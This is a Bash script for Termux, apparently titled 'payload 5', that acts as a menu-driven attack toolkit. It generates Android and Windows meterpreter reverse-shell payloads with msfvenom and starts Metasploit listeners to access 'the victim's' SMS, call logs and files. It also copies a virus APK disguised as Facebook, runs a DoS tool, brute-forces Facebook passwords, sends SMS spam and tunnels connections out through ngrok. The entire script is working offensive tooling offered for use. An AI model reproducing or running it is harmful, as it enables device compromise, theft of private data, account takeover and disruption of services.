clear

#colors
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
n=install




cd $HOME/payload5


echo -e "$green "

figlet  -f big "                  payload 5  "
echo -e "$blue"
echo '        .e$$$$e.'
sleep 0.1
echo '      e$$$$$$$$$$e'
sleep 0.1
echo '     $$$$$$$$$$$$$$'
echo '    d$$$$$$$$$$$$$$b'
echo '    $$$$$$$$$$$$$$$$                    '
sleep 0.1
echo '   4$$$$$$$$$$$$$$$$F'
sleep 0.1
echo '   4$$$$$$$$$$$$$$$$F'
echo '    $$$" "$$$$" "$$$          '
echo '    $$F   4$$F   4$$===============||'
sleep 0.1
echo '     $F   4$$F   4$"               ||       '
echo '     $$   $$$$   $P                ||      '
echo '     $$$$$$""$$$$$                 ||     '
echo '      $$$$F  4$$$$                 || '
sleep 0.1
echo '       "$$$ee$$$"                  ||'
echo '       .4*$$$$F4                \  ||  /'
echo '        $     .$                 \ || /'
echo '        "$$$$$$"     [90]helpℹ️    \||/   '   
echo '         ^$$$$                     \/       '
echo -e "$bluo p $green a $reset y $purple l $cyan o $yellow a $green d"
echo -e "$red"
echo '                               exit=CTRL+c'
echo -e "$green         +________________________________________________________+"
echo -e "   $cyan      |  [1] metasploit ⚔️|  $blue  [2] nmap 🌎| $purple  [3] dos attack ⛔ |             "
#echo -e "         | $green            --------------------------------            |  "
echo -e " $yellow        |  [4]   ngrok 🌐  |  $red  [5] virus ☢️️|  $reset [6]   Termux 📟   |    "
echo "                                                 "
echo -e "   $purple              |               [7]facebook              |"
echo -e " $green                  --------------------------------------"


echo -e " $blue "
echo " [00] Exit                                                   [99] update"
echo -e "$green"
echo -e "$cyan"
echo  "|---{my ip}---| " 
      curl ifconfig.me
echo -e "$green "
date
echo -e "$yellow"
echo ''
read -p "number =====> " ali

p(){
echo -e "$blue "
read -p "                  ip=====> " ip
sleep 2
read -p "                      port===> " p
sleep 2
read -p "                        name===> " n

cd
cd metasploit-framework

./msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$p R >  /sdcard/payload5/$n.apk
echo -e " $cyan  Path of the pyload----->  $yellow  /sdcard/payload5/$n.apk"
echo -e "$purple end the payload+++++++++++++++++++++++ "
sleep 2
cd $HOME/payload5
read -p "                  --------> entar"
payload.sh
}
#--------------------------------------------------

w(){

echo -e "$purple"
read -p "                  ip=====> " ipp
sleep 2
read -p "                      port===> " pp
sleep 2
read -p "                        name===> " nn

cd
cd metasploit-framework

./msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ipp LPORT=$pp -f exe e >  /sdcard/payload5/$nn.exe
echo -e "$cyan    Path of the pyload-----> $yellow  /sdcard/payload5/$nn.exe"
echo -e "$purple end the payload+++++++++++++++++++++ "
sleep 2
cd $HOME/payload5
read -p "                   -------->entar"
payload.sh
}
#--------------------------------------------------

d(){
rm -rf $HOME/metasploit-framework
rm -rf $HOME/metasploit.sh
cp .metasploit.sh $HOME/metasploit.sh
chmod +x $HOME/metasploit.sh
sh $HOME/metasploit.sh



}

#--------------------------------------------------

#--------------------------------------------------

nd(){
apt $n  nmap -y

payload.sh
}

#--------------------------------------------------


ip(){

read -p "            ip-------->" ip
apt $n  nmap
clear
nmap $ip
sleep 3
read -p "                   ------------>entar"
payload.sh
}

#--------------------------------------------------
hm(){
read -p "                   ip/link------>" ip
read -p "                      port/80---->" pr
read -p "                         Time in seconds---->" ti
pkg $n python
clear
echo -e "$green"
cd .hammer
chmod +x hammer.py
python hammer.py -s $ip -p $pr -t $ti


}

#--------------------------------------------------
all(){
apt $n  nmap
clear
nmap -sn 192.168.1.1/24
read -p "                        ---------->entar"
payload.sh

}


ii(){

echo '             facebook'
echo -e "$green"
echo '        Email:======>  https://www.facebook.com/ali.max.796774'
echo -e "$purple"
echo '                                        /\'
echo -e "                $blue    {1}open facebook   $purple ||"
echo -e "             $red       {2}open youtube    $purple ||"
echo -e "$purple                                        ||"
echo '                                        ||'
echo '  To communicate with me  ==============='

read -p "                  ----------> entar(back) +++++>" ss
if [ "$ss" -eq "1"  ]; then
termux-open https://www.facebook.com/ali.max.796774
payload.sh

elif [ "$ss" -eq "2"  ]; then

termux-open https://www.youtube.com/channel/UCTlvUAypIKJ2BCUaUHKwrxg
payload.sh
else
payload.sh
fi
}
#--------------------------------------------------
te(){
read -p "            name-------> " ali
rm $HOME/.bashrc
sed "s/Sniper/$ali/" $HOME/payload5/.bashrc > $HOME/.bashrc
pkg install figlet

payload.sh


}


#--------------------------------------------------
pkp(){

apt $n nano -y &&  apt $n wgit -y && apt $n fish -y


payload.sh
}


aaa(){
echo -e "$cyan"
read -p "                  ip----->" ip
read -p "                    port---->" port
cd .msf
echo "use exploit/multi/handler" > .msf.rc
echo "set payload android/meterpreter/reverse_tcp" >> .msf.rc
echo "set lhost $ip" >> .msf.rc
echo "set lport $port" >> .msf.rc
echo "exploit" >> .msf.rc
msfconsole -r .msf.rc


}
#--------------------------------------------------
www(){
echo -e "$red"
read -p "                  ip----->" ip
read -p "                    port---->" port
cd .msf
echo "use exploit/multi/handler" > .msf1.rc
echo "set payloads windows/meterpreter/reverse_tcp" >> .msf1.rc
echo "set lhost $ip" >> .msf1.rc
echo "set lport $port" >> .msf1.rc
echo "exploit" >> .msf1.rc
msfconsole -r .msf1.rc


}
#--------------------------------------------------
error(){

echo -e "++++++++++++++++> please wait <++++++++++++++++"
cd .msf
chmod +x *
sh .error.sh

}
#--------------------------------------------------
up(){
echo "                              (33)== back"
read -p " Enter update----------> " up
if [ "$up" -eq "33"  ]; then
payload.sh
else echo "                    -------> Hi new update <------"
cd 
setup5.sh




fi

}
#--------------------------------------------------


xxx(){
figlet  -f big  "             good bay  "






}


ngrok(){
echo -e "$yellow"
echo "                           open the http://www.ngrok.com"
echo "                   The link starts (./ngrok)"
echo ""
echo "                           [0] back"
read -p "link- - - - > " link
if [ "$link" -eq "0"  ]; then
payload.sh
else
echo -e "$green"
cp $HOME/payload5/.ngrok/ngrok $HOME
cd $HOME && chmod 777 ngrok
$link
echo -e "$yellow"
echo "                                   good pay"

fi
}

#--------------------------------------------------



ngk(){
echo "                                       [0]back"
read -p "         [port]- - - > " port
if [ "$port" -eq "0"  ]; then
payload.sh
else
cd &&  ./ngrok http $port
fi

}
#--------------------------------------------------



ngkk(){
echo "                                       [0]back"
read -p "         [port]- - - > " port
if [ "$port" -eq "0"  ]; then
payload.sh
else
cd && ./ngrok tcp $port
fi

}


sms(){
echo -e "$red"
echo "                                 [0]back"
echo -e "$green    "
cd $HOME/payload5/.msf && ls
echo ""
read -p "name.txt ------> " n
if [ "$n" -eq "0"  ]; then
cd $HOME/payload5
payload.sh
else
nano $n
fi
}

openn(){
echo -e "$red"
echo "                                 [0]back"
echo -e "$green    "
cd $HOME/payload5/.msf && ls
echo ""
read -p "name.txt ------> " n
echo -e "$green"
if [ "$n" -eq "0"  ]; then
cd $HOME/payload5
payload.sh
else
mv   $n /sdcard
echo "                                   good pay"
fi



}





vir(){
echo -e " $blue"
echo "                            [0]back"
read -p "          entar" vv
if [ "$vv" -eq "0"  ]; then
payload.sh
else
cp $HOME/payload5/.viros/Facebook.apk /sdcard
echo -e "$green               end the vairos----->(facebook) "
echo ""
echo "      Path of the pyload----->  sdcard/facebook.apk"
fi
echo -e "$yellow"
read -p "                              ------->entar<------"
payload.sh


}


virr(){

echo -e " $blue"
echo "                            [0]back"
read -p "  name -------> " vv
if [ "$vv" -eq "0"  ]; then
payload.sh
else
cp $HOME/payload5/.viros/virs.apk /sdcard/$vv.apk
echo -e "$green               end the vairos----->($vv.apk)"
echo ""
echo "      Path of the pyload----->  sdcard/$vv.apk"
fi
echo -e "$yellow"
read -p "                              ------->entar<------"
payload.sh

}


fac(){
echo -e "  $red         [1]add password        [0]back"
echo ""
echo -e " $green      id = E-mail "
echo "               password = password.txt "
read -p "            entat   " ali

if [ "$ali" -eq "1"  ]; then
nano $HOME/payload5/.facebook/password.txt
elif [ "$ali" -eq "0" ]; then
payload.sh
else
pkg $n python2
pip2 install mechanize
clear
echo -e " $yellow                 password = password.txt"
echo -e "$green"
cd $HOME/payload5/.facebook
python2 $HOME/payload5/.facebook/facebook.py
fi

}
smms(){
pkg $n python2
clear
cd .Spammer-Grab

chmod +x auto-install.sh spammer.py
echo -e "$yellow"
read -p "       Enter the number ----> " f
echo -e "$green"
sleep 1
echo "                            ===+ $f send++"
sleep 1
echo "                               =========+ $f send++"
sleep 1
echo "                                   ==============+ $f send++"
./auto-install.sh
python2 spammer.py --delay 30 $f
cd ..
payload.sh




}








#--------------------------------------------------


if [ "$ali" -eq "1"  ]; then
#--------------------------------------------------

echo -e "$red                                          [00]back"
echo -e "$cyan"
echo "               [1]payload android 💉📲"
echo "               [2]payload windows 💉💻"
echo "               [3]Android penetration msf 📟📲"
echo "               [4]windows penetration msf 📟💻"
echo "               [5]open (sms,calllog,....txt) The victim 📞📩   "
echo "               [6]Open the victim files that you downloaded 📁 "
echo "               [7]Download msf ⬇️"
echo "               [8]error metasploit ⚠️             "
echo -e "$green"
read -p "     number------->  " alii
#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------


if [ "$alii" -eq "1"  ]; then
        p
fi

if [ "$alii" -eq "2"  ]; then
     w


fi

if [ "$alii" -eq "3"  ]; then
        aaa

fi

if [ "$alii" -eq "4"  ]; then
        www
fi

if [ "$alii" -eq "5"  ]; then
        sms
fi

if [ "$alii" -eq "6"  ]; then
        openn
fi

if [ "$alii" -eq "7"  ]; then
        d
fi

if [ "$alii" -eq "8"  ]; then
        error
fi
if [ "$alii" -eq "00"  ]; then
        payload.sh

else clear
echo -e "$red"
figlet -f big "ERROR"

 payload.sh
fi



#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
elif [ "$ali" -eq "2"  ]; then
echo -e "   $red                                       [00]back"
echo -e "$blue"
echo "          [1]check the ip 🔎"
echo "          [2]all Devices🎛"
echo "          [3]Download nmap⬇️ "
echo -e "$green"
read -p "     number-------> " aallii

if [ "$aallii" -eq "1"  ]; then
        ip


fi

if [ "$aallii" -eq "2"  ]; then
        all


fi
if [ "$aallii" -eq "3"  ]; then
        nd


fi
if [ "$aallii" -eq "00"  ]; then
        payload.sh

else clear
echo -e "$red"
figlet -f big "ERROR"

 payload.sh
fi

#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
elif [ "$ali" -eq "3"  ]; then
echo -e " $red                                         [00]back"
echo -e "$purple"
echo "             [1]dos attack🌎"
echo ""
echo -e "$green"
read -p "     number------->  " allii

if [ "$allii" -eq "1"  ]; then
        hm
fi

if [ "$allii" -eq "00"  ]; then
        payload.sh

else clear
echo -e "$red"
figlet -f big "ERROR"

 payload.sh

fi

#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------

elif [ "$ali" -eq "4"  ]; then
echo -e "      $red                                    [00]back" 
echo -e "$yellow"
echo "           [1]open ngrok http 🌐"
echo "           [2]open ngrok tcp  🌐"
echo "           [3]Download ngrok ⬇️ "
echo -e "$green"
read -p "     number------->  " alli

if [ "$alli" -eq "1"  ]; then
        ngk
fi
if [ "$alli" -eq "2"  ]; then
        ngkk
fi
if [ "$alli" -eq "3"  ]; then
        ngrok
fi

if [ "$alli" -eq "00"  ]; then
        payload.sh

else clear
echo -e "$red"
figlet -f big "ERROR"

 payload.sh

fi

#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------


elif [ "$ali" -eq "5"  ]; then
echo -e "     $yellow                                     [00]back"
echo -e "$red"
echo "          [1]Create a semi-Facebook (virus)️️️☢️"
echo "          [2]Create a normal (virus)☢️"
echo "          [3]send sms to *********"
echo -e "$green"
read -p "     number------->  " aall
if [ "$aall" -eq "1"  ]; then
        vir
fi
if [ "$aall" -eq "2"  ]; then
        virr
fi

if [ "$aall" -eq "3"  ]; then
        smms
fi


if [ "$aall" -eq "00"  ]; then
        payload.sh
else clear
echo -e "$red"
figlet -f big "ERROR"

 payload.sh

fi
#--------------------------------------------------

#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------

elif [ "$ali" -eq "6"  ]; then
echo -e "      $red                                    [00]back"
echo -e "$reset"
echo "             [1]Change the shape of Termux📟"
echo "             [2]Download nano python fish git️⬇️ "
echo -e "$green"
read -p "     number------->  " al
if [ "$al" -eq "1"  ]; then
        te
fi

if [ "$al" -eq "2"  ]; then
        pkp
fi

if [ "$al" -eq "00"  ]; then
        payload.sh

else clear
echo -e "$red"
figlet -f big "ERROR"

 payload.sh

fi

#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------

elif [ "$ali" -eq "7"  ]; then
echo -e "   $red                                       [00]back"
echo -e "$purple"
echo "         [1]Guess facebook"
echo -e "$green"
read -p "     number------->  " ala
if [ "$ala" -eq "1"  ]; then
        fac
fi

if [ "$ala" -eq "00"  ]; then
        payload.sh

else clear
echo -e "$red"
figlet -f big "ERROR"

 payload.sh

fi


#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------

elif [ "$ali" -eq "00"  ]; then
	xxx

#--------------------------------------------------
elif [ "$ali" -eq "99"  ]; then
	up
#--------------------------------------------------
elif [ "$ali" -eq "90"  ]; then
        ii
#--------------------------------------------------








else clear
echo -e "$red"
figlet -f big "ERROR"

 payload.sh
#--------------------------------------------------
#--------------------------------------------------
#--------------------------------------------------
#-}---------------------------------------------
fi
#--------------------------------------------------


